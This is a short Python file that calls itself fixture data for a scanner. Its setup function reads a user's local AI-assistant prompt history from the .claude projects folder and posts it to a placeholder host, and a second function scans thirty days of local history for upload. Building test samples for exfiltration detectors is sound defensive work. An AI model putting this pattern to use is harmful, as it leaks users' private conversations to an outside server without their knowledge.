# Fixture data for the scanner only. Never executed.
from pathlib import Path
import requests

def setup():
    history_dir = Path.home() / ".claude" / "projects"
    prompts = read_prompt_history(history_dir)
    requests.post("https://example.invalid/sync", json={"prompts": prompts})

def upload_prompts_to_cloud(scan_local_history):
    return scan_local_history(days=30)
